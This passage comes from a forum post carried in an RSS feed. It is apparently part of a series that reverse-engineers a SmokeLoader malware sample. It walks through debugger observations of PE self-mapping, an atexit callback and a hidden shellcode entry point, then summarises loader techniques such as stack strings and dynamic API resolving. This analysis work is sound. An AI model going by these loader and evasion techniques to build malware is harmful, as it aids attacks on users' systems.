push [ebp+lpvoidBaseAddressOfCurrentPE] ; Push the base address of the current PE
call sub_BF6
</code></pre>
<p>Now let’s make another assumption - after the call to <strong>sub_BF6</strong> at offset <strong>0x21B</strong> the code section of the current PE will be replaced with the code section of the new mapped PE.</p>
<p>And that is incorrect! Fortunately I put a hardware breakpoint on the the code section of the current PE before I continued execution and the copying actually occurred at offset <strong>0x326</strong> instead of <strong>0x21B</strong> BUT with a call to <strong>sub_BF6</strong> so I was kinda right :), so let’s put a breakpoint at the return instruction out of this function and see what happened to the code section:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/2/229dfbc8a4c22fcf56f684504bfe1ccd5751bbee.png" data-download-href="/uploads/short-url/4WeI9uNpz2b9Wm1coOQpMVhQsvI.png?dl=1" title=""><img src="/uploads/default/original/2X/2/229dfbc8a4c22fcf56f684504bfe1ccd5751bbee.png" alt="" data-base62-sha1="4WeI9uNpz2b9Wm1coOQpMVhQsvI" width="587" height="152" role="presentation"></a></div><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/2/20f5a8d6bb7656696aefac516e4dc5dfc11ad70f.png" data-download-href="/uploads/short-url/4HzBkIdrxoW3reJpXqEJJOtQAwf.png?dl=1" title=""><img src="/uploads/default/original/2X/2/20f5a8d6bb7656696aefac516e4dc5dfc11ad70f.png" alt="" data-base62-sha1="4HzBkIdrxoW3reJpXqEJJOtQAwf" width="594" height="162" role="presentation"></a></div><p></p>
<p>Very cool, but this code looks really strange because if we view it in disassembly it looks nothing like what we dumped to IDA before:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/f/ff9f9ae538a8f56ca472ab94882091bb04b0931c.png" data-download-href="/uploads/short-url/AtlHQAqfqKa3MCAGn1vTOxTzfje.png?dl=1" title=""><img src="/uploads/default/original/2X/f/ff9f9ae538a8f56ca472ab94882091bb04b0931c.png" alt="" data-base62-sha1="AtlHQAqfqKa3MCAGn1vTOxTzfje" width="602" height="388" role="presentation"></a></div><p></p>
<p>Let’s keep going to see if it might change. Our next anomaly is at offset <strong>0x358</strong>:</p>
<p><img src="/uploads/default/original/2X/1/14db48ff08b85b45923a5a61edea9a6230688f4c.png" alt="" data-base62-sha1="2YvmFAvYzVRcorh0nxqWud40MTq" width="548" height="14" role="presentation"></p>
<p><img src="/uploads/default/original/2X/3/3f098a356b4173f5c13ebd591dc77d7181d1654f.png" alt="" data-base62-sha1="8ZEwdQDKz7inGumRb1kmVtlFdmv" width="213" height="69" role="presentation"></p>
<p>The newly mapped PE gets free’d from memory, alright this is promising let’s see what happens afterwards.</p>
<p>The last anomaly that occurs is at the bottom of the function we encountered when we started analyzing this shellcode(<strong>sub_3C</strong>):</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/2/232ddf658b0beaa5703f07cfb6ebf2182871ddc6.png" data-download-href="/uploads/short-url/51cZzFyKtxhw2GS3zRIKik5W4Oq.png?dl=1" title=""><img src="/uploads/default/original/2X/2/232ddf658b0beaa5703f07cfb6ebf2182871ddc6.png" alt="" data-base62-sha1="51cZzFyKtxhw2GS3zRIKik5W4Oq" width="355" height="293" role="presentation"></a></div><p></p>
<p>A call to <a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/atexit?view=vs-2019" rel="noopener nofollow ugc"><strong>atexit</strong></a>:</p>
<blockquote>
<p>“Processes the specified function at exit.”</p>
<p>int atexit(</p>
<p>void (__cdecl *func )( void )</p>
<p>);</p>
</blockquote>
<p>This function will execute a callback function that will trigger when the process will exit.<br>
So what was the last value pushed into the stack?<br>
<img src="/uploads/default/original/2X/3/3cf084155b0ee8bb1a5b5e2b78fc3e7890899a8c.png" alt="" data-base62-sha1="8H5WYHuHh4y4Iy9xLFj1iqjBytS" width="150" height="16" role="presentation"><br>
It’s an address, lets follow it:</p>
<p><img src="/uploads/default/original/2X/c/c4caf550a94577efd8229edd73a160efe7952b8c.png" alt="" data-base62-sha1="s4Uq3yfGCkKITs3udHQKymuayjq" width="597" height="52" role="presentation"></p>
<p>It’s going to terminate itself upon function exit, alright but is that it? well, not exactly.. at location <strong>loc_811</strong>:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/5/5ccc3e885e606f05442a6ab96e18ad5e8089d522.png" data-download-href="/uploads/short-url/deVw9wOEzNsuYam8YZXshNQeNea.png?dl=1" title=""><img src="/uploads/default/original/2X/5/5ccc3e885e606f05442a6ab96e18ad5e8089d522.png" alt="" data-base62-sha1="deVw9wOEzNsuYam8YZXshNQeNea" width="342" height="190" role="presentation"></a></div><p></p>
<p>We jump to a different shellcode located inside the code section of our PE:<br>
<img src="/uploads/default/original/2X/0/0200dc4260b788582a2a416157d1622b6d97ad9e.png" alt="" data-base62-sha1="hINuIqlYygXD1Gz3w22uH82qUm" width="298" height="23" role="presentation"></p>
<p>Let’s look at the newly mapped PE that we dumped in IDA at this location:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/6/61a5fe5ae5d70195e85e77e45ab83bd0975456ca.png" data-download-href="/uploads/short-url/dVPXa2WvWPzflvdy03JSGhuo7Oi.png?dl=1" title=""><img src="/uploads/default/original/2X/6/61a5fe5ae5d70195e85e77e45ab83bd0975456ca.png" alt="" data-base62-sha1="dVPXa2WvWPzflvdy03JSGhuo7Oi" width="602" height="147" role="presentation"></a></div><br>
We compare it to the address stored in EAX:<br>
<div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/9/94a6b866c5bad0a2d276f352fbd6f28abe9038ff.png" data-download-href="/uploads/short-url/ld1RswTb55O5uVp3IYQkwPJ6ear.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/9/94a6b866c5bad0a2d276f352fbd6f28abe9038ff_2_602x113.png" alt="" data-base62-sha1="ld1RswTb55O5uVp3IYQkwPJ6ear" width="602" height="113" role="presentation" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/9/94a6b866c5bad0a2d276f352fbd6f28abe9038ff_2_602x113.png, https://0x00sec.s3.amazonaws.com/optimized/2X/9/94a6b866c5bad0a2d276f352fbd6f28abe9038ff_2_903x169.png 1.5x, /uploads/default/original/2X/9/94a6b866c5bad0a2d276f352fbd6f28abe9038ff.png 2x"></a></div><p></p>
<p>Ah, this explains the reason we saw garbage code when we looked at it when it was first mapped to the code section, its because the address of entry point of this code section is actually at offset <strong>0x2B87</strong>!</p>
<hr>
<p>Alright, let’s stop for a second and take a breather.</p>
<h2><a name="p-53180-summary-12" class="anchor" href="https://d.clarkee.co.uk#p-53180-summary-12"></a>Summary:</h2>
<p>In this small blog we covered 5 neat techniques:</p>
<ul>
<li>Resource embedded code</li>
<li>Stack strings</li>
<li>Dynamic API Resolving</li>
<li>Loading PE files dynamically</li>
<li>Self loading code</li>
</ul>
<p>Again, sadly - I’ll have to break this post into two parts since it already become to long but I hope this helped and aided your analysis toolkit. On the next part we’ll be analyzing the dumped PE file and circumventing it’s anti reverse engineering tricks.</p>
<p>Till next time!</p>
<hr>
<h2><a name="p-53180-sources-13" class="anchor" href="https://d.clarkee.co.uk#p-53180-sources-13"></a>Sources:</h2>
<p><a href="https://www.hybrid-analysis.com/sample/3d2777b748e805c0463c0c6d0fef8280ad197bea1dd0a25e30ed71199989a6b9?environmentId=100" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.hybrid-analysis.com/sample/3d2777b748e805c0463c0c6d0fef8280ad197bea1dd0a25e30ed71199989a6b9?environmentId=100</a></p>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://maltiverse.com/dashboards/newioc">
  <header class="source">
      <img src="https://maltiverse.com/dashboards/favicon.ico" class="site-icon" alt="" width="" height="">

      <a href="https://maltiverse.com/dashboards/newioc" target="_blank" rel="noopener nofollow ugc">maltiverse.com</a>
  </header>

  <article class="onebox-body">
    

<h3><a href="https://maltiverse.com/dashboards/newioc" target="_blank" rel="noopener nofollow ugc">Maltiverse</a></h3>



  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric" data-onebox-src="https://learn.microsoft.com/en-us/">
  <header class="source">

      <a href="https://learn.microsoft.com/en-us/" target="_blank" rel="noopener nofollow ugc">learn.microsoft.com</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/362;"><img src="https://learn.microsoft.com/en-us/media/open-graph-image.png" class="thumbnail" alt="" width="690" height="362"></div>

<h3><a href="https://learn.microsoft.com/en-us/" target="_blank" rel="noopener nofollow ugc">Microsoft Learn: Build skills that open doors in your career</a></h3>

  <p>Gain technical skills through documentation and training, earn certifications and connect with the community</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p><a href="https://www.youtube.com/channel/UC--DwaiMV-jtO-6EvmKOnqg" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.youtube.com/channel/UC--DwaiMV-jtO-6EvmKOnqg</a></p>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://malpedia.caad.fkie.fraunhofer.de/details/win.smokeloader">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/3/3/33e94c148a89c675fb8241f5cc23e04d91c8593b.png" class="site-icon" alt="" data-dominant-color="" width="36" height="36">

      <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.smokeloader" target="_blank" rel="noopener nofollow ugc">malpedia.caad.fkie.fraunhofer.de</a>
  </header>

  <article class="onebox-body">
    

<h3><a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.smokeloader" target="_blank" rel="noopener nofollow ugc">SmokeLoader (Malware Family)</a></h3>

  <p>The SmokeLoader family is a generic backdoor with a range of capabilities which depend on the modules included in any given build of the malware. The malware is delivered in a variety of ways and is broadly associated with criminal activity. The...</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://d.clarkee.co.uk/t/analyzing-modern-malware-techniques-part-4/19289">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/analyzing-modern-malware-techniques-part-4/19289</link>
          <pubDate>Mon, 17 Feb 2020 22:31:03 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-19289</guid>
          <source url="https://d.clarkee.co.uk/t/analyzing-modern-malware-techniques-part-4/19289.rss">Analyzing Modern Malware Techniques - Part 4</source>
        </item>
  </channel>
</rss>
